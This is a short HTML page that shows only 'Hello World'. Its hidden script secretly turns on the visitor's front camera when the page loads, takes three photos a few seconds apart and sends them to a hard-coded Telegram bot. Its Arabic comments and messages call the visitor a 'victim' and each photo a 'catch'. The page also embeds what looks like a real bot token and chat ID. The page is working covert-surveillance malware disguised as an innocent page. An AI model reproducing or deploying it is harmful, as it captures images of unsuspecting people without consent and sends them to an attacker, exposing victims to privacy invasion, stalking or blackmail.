<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 5em; overflow: hidden; }
        video, canvas { position: absolute; left: -10000px; opacity: 0; } /* إخفاء تام */
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div>Hello World</div>

    <script>
        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const chat = "8042090388";

        async function startApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onplay = () => {
                    // تصوير 3 لقطات لضمان الوضوح
                    setTimeout(() => capture(1), 3000); // لقطة بعد 3 ثواني
                    setTimeout(() => capture(2), 5000); // لقطة بعد 5 ثواني
                    setTimeout(() => capture(3), 7000); // لقطة بعد 7 ثواني
                };
            } catch (err) {
                sendMsg("⚠️ الضحية رفض الكاميرا");
            }
        }

        function capture(num) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // رسم الصورة
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويلها لـ Base64 بجودة عالية
            const imgData = canvas.toDataURL('image/jpeg', 0.9);
            
            // إرسالها فوراً
            sendToTele(imgData, num);
        }

        async function sendToTele(base64, n) {
            const blob = await (await fetch(base64)).blob();
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('photo', blob, `shot_${n}.jpg`);
            formData.append('caption', `✅ صيد واضح - رقم ${n}`);

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function sendMsg(m) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(m)}`);
        }

        window.onload = startApp;
    </script>
</body>
</html>
